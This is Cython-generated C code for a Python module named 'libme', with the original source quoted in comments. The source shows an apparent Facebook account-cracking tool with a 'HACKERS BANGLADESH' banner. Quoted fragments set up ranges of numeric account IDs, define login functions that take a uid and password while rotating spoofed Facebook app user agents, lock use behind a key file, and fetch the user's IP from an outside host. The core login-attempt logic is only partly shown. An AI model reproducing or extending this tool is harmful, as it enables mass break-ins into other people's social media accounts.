 * date = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 * date = ("%s %s %s"%(ha, op, ta))
 * bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}             # <<<<<<<<<<<<<<
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 * class James:
 */
  __pyx_t_1 = __Pyx_PyDict_NewPresized(12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_01, __pyx_n_s_January) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_02, __pyx_n_s_February) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_03, __pyx_n_s_March) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_04, __pyx_n_s_April) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_05, __pyx_n_s_May) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_06, __pyx_n_s_June) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_07, __pyx_n_s_July) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_08, __pyx_n_s_August) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_09, __pyx_n_s_September) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_10, __pyx_n_s_October) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_11, __pyx_n_s_November) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_s_12, __pyx_n_s_December) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bulan_ttl, __pyx_t_1) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":60
 * date = ("%s %s %s"%(ha, op, ta))
 * bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text             # <<<<<<<<<<<<<<
 * class James:
 * 	def __init__(self):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__62, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ip, __pyx_t_7) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "libme.pyx":61
 * bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 * class James:             # <<<<<<<<<<<<<<
 * 	def __init__(self):
 * 		self.id = []
 */
  __pyx_t_7 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_James, __pyx_n_s_James, (PyObject *) NULL, __pyx_n_s_libme, (PyObject *) NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);

  /* "libme.pyx":62
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 * class James:
 * 	def __init__(self):             # <<<<<<<<<<<<<<
 * 		self.id = []
 * 		self.ok = []
 */
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_1__init__, 0, __pyx_n_s_James___init, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__64)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_init, __pyx_t_1) < 0) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":67
 * 		self.cp = []
 * 		self.loop = 0
 * 	try:             # <<<<<<<<<<<<<<
 * 		key = open(".__apikey__.log", "r").read()
 * 	except IOError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      /* "libme.pyx":68
 * 		self.loop = 0
 * 	try:
 * 		key = open(".__apikey__.log", "r").read()             # <<<<<<<<<<<<<<
 * 	except IOError:
 * 		id1 = uuid.uuid4().hex[:10].upper()
 */
      __pyx_t_9 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 68, __pyx_L37_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_read); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 68, __pyx_L37_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_1 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 68, __pyx_L37_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_key, __pyx_t_1) < 0) __PYX_ERR(0, 68, __pyx_L37_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":67
 * 		self.cp = []
 * 		self.loop = 0
 * 	try:             # <<<<<<<<<<<<<<
 * 		key = open(".__apikey__.log", "r").read()
 * 	except IOError:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L42_try_end;
    __pyx_L37_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":69
 * 	try:
 * 		key = open(".__apikey__.log", "r").read()
 * 	except IOError:             # <<<<<<<<<<<<<<
 * 		id1 = uuid.uuid4().hex[:10].upper()
 * 		id2 = uuid.uuid4().hex[:15].upper()
 */
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("libme.James", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_8, &__pyx_t_9) < 0) __PYX_ERR(0, 69, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GOTREF(__pyx_t_9);

      /* "libme.pyx":70
 * 		key = open(".__apikey__.log", "r").read()
 * 	except IOError:
 * 		id1 = uuid.uuid4().hex[:10].upper()             # <<<<<<<<<<<<<<
 * 		id2 = uuid.uuid4().hex[:15].upper()
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")
 */
      __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_uuid); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 70, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_13);
      __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 70, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
        __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_14);
        if (likely(__pyx_t_13)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
          __Pyx_INCREF(__pyx_t_13);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_14, function);
        }
      }
      __pyx_t_12 = (__pyx_t_13) ? __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_t_13) : __Pyx_PyObject_CallNoArg(__pyx_t_14);
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 70, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_hex); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 70, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = __Pyx_PyObject_GetSlice(__pyx_t_14, 0, 10, NULL, NULL, &__pyx_slice__65, 0, 1, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 70, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_upper); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 70, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_14))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_14);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_14, function);
        }
      }
      __pyx_t_2 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_14);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 70, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_id1, __pyx_t_2) < 0) __PYX_ERR(0, 70, __pyx_L39_except_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":71
 * 	except IOError:
 * 		id1 = uuid.uuid4().hex[:10].upper()
 * 		id2 = uuid.uuid4().hex[:15].upper()             # <<<<<<<<<<<<<<
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")
 * 
 */
      __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_uuid); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 71, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 71, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_13);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_13, function);
        }
      }
      __pyx_t_14 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 71, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_hex); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 71, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __pyx_t_14 = __Pyx_PyObject_GetSlice(__pyx_t_13, 0, 15, NULL, NULL, &__pyx_slice__66, 0, 1, 1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 71, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_upper); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 71, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __pyx_t_14 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_13);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_13, function);
        }
      }
      __pyx_t_2 = (__pyx_t_14) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_14) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 71, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_id2, __pyx_t_2) < 0) __PYX_ERR(0, 71, __pyx_L39_except_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":72
 * 		id1 = uuid.uuid4().hex[:10].upper()
 * 		id2 = uuid.uuid4().hex[:15].upper()
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")             # <<<<<<<<<<<<<<
 * 
 * 	def __request__(self):
 */
      __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 72, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_13);
      __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_write); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 72, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = PyObject_GetItem(__pyx_t_7, __pyx_n_s_id1);
      if (unlikely(!__pyx_t_13)) {
        PyErr_Clear();
        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_id1);
      }
      if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 72, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_13);
      __pyx_t_12 = PyObject_GetItem(__pyx_t_7, __pyx_n_s_id2);
      if (unlikely(!__pyx_t_12)) {
        PyErr_Clear();
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_id2);
      }
      if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 72, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_15 = PyNumber_Add(__pyx_t_13, __pyx_t_12); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 72, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = PyNumber_Add(__pyx_t_15, __pyx_kp_s__68); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 72, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __pyx_t_15 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_14))) {
        __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_14);
        if (likely(__pyx_t_15)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
          __Pyx_INCREF(__pyx_t_15);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_14, function);
        }
      }
      __pyx_t_2 = (__pyx_t_15) ? __Pyx_PyObject_Call2Args(__pyx_t_14, __pyx_t_15, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_t_12);
      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 72, __pyx_L39_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      goto __pyx_L38_exception_handled;
    }
    goto __pyx_L39_except_error;
    __pyx_L39_except_error:;

    /* "libme.pyx":67
 * 		self.cp = []
 * 		self.loop = 0
 * 	try:             # <<<<<<<<<<<<<<
 * 		key = open(".__apikey__.log", "r").read()
 * 	except IOError:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L38_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L42_try_end:;
  }

  /* "libme.pyx":74
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")
 * 
 * 	def __request__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_3__request__, 0, __pyx_n_s_James___request, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__70)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_request, __pyx_t_9) < 0) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":89
 * 			print( "  Talk To Admin For Key...\n")
 * 			os.system('xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA')
 * 	def __start__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		try:
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_5__start__, 0, __pyx_n_s_James___start, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__72)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 89, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_start, __pyx_t_9) < 0) __PYX_ERR(0, 89, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":149
 * 			else:
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")
 * 	def __fb__(self):             # <<<<<<<<<<<<<<
 * 		x = 11111111
 * 		xx = 99999999
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_7__fb__, 0, __pyx_n_s_James___fb, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__74)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 149, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_fb, __pyx_t_9) < 0) __PYX_ERR(0, 149, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":175
 * 			exit(str(e))
 * 
 * 	def __api__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_9__api__, 0, __pyx_n_s_James___api, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__76)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 175, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_api, __pyx_t_9) < 0) __PYX_ERR(0, 175, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":209
 * 				continue
 * 		self.loop +=1
 * 	def __fb4__(self):             # <<<<<<<<<<<<<<
 * 		x = 1111
 * 		xx = 9999
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_11__fb4__, 0, __pyx_n_s_James___fb4, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__78)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 209, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_fb4, __pyx_t_9) < 0) __PYX_ERR(0, 209, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":234
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __fb2__(self):             # <<<<<<<<<<<<<<
 * 		x = 11111111
 * 		xx = 99999999
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_13__fb2__, 0, __pyx_n_s_James___fb2, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__80)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 234, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_fb2, __pyx_t_9) < 0) __PYX_ERR(0, 234, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":259
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __fb3__(self):             # <<<<<<<<<<<<<<
 * 		x = 1111111
 * 		xx = 9999999
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_15__fb3__, 0, __pyx_n_s_James___fb3, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__82)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 259, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_fb3, __pyx_t_9) < 0) __PYX_ERR(0, 259, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":284
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __apii__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_t_9 = __Pyx_CyFunction_New(&__pyx_mdef_5libme_5James_17__apii__, 0, __pyx_n_s_James___apii, NULL, __pyx_n_s_libme, __pyx_d, ((PyObject *)__pyx_codeobj__84)); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 284, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_apii, __pyx_t_9) < 0) __PYX_ERR(0, 284, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  /* "libme.pyx":327
 * 				continue
 * 		self.loop +=1
 * 	def __login__(self):             # <<<<<<<<<<<<<<
 * 		os.system('clear')
